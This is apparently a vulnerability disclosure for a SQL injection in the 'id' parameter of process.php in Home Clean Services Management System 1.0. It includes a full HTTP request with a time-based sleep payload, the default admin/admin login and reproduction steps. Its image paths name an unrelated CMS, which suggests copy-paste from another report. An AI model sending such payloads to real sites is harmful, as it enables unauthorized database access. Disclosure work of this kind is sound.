# Home Clean Services Management System process.php id SQL injection

**Exploit Title: Home Clean Services Management System process.php id SQL inject**

**Exploit Author: https://github.com/xiaosguang/cve/**

**Vendor Homepage: https://www.sourcecodester.com/php/15293/home-clean-service-free-source-code.html**

**Software Link: https://www.sourcecodester.com/download-code?nid=15293&title=Home+Clean+Service+System+in+PHP+Free+Source+Code**

**Version: Home Clean Services Management System 1.0**

**Tested on: Windows, Apache ,Mysql**

**Description**

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection Home Clean Services Management System does not filter the content correctly at the "process.php" id module, resulting in the generation of SQL injection.

    Payload used:

```
GET /HCS/public_html/admin/process.php?id=21'+and+sleep(3)--+&name=ALvin%20Gumatay HTTP/1.1
Host: aaa.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://aaa.com/HCS/public_html/admin/manage_house.php
Connection: keep-alive
Cookie: PHPSESSID=a61gtlsps39bcudp17o7o3b0k7
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```



## Proof of Concept

1. Login the CMS. Admin Default Access: Email: admin Password: admin

2. Open Page http://aaa.com/HCS/public_html/admin/process.php?id=21&name=ALvin%20Gumatay
![image-20250106061315590](dingfanzu-CMS%20checkOrder.php%20shopId%20SQL-inject.assets/image-20250106061315590.png)

Change the parameter 21 of id to 21'+and+sleep(3)--+, and find that the sleep function is executed.

![image-20250106061825321](dingfanzu-CMS%20checkOrder.php%20shopId%20SQL-inject.assets/image-20250106061825321.png)

![image-20250106061928651](dingfanzu-CMS%20checkOrder.php%20shopId%20SQL-inject.assets/image-20250106061928651.png)

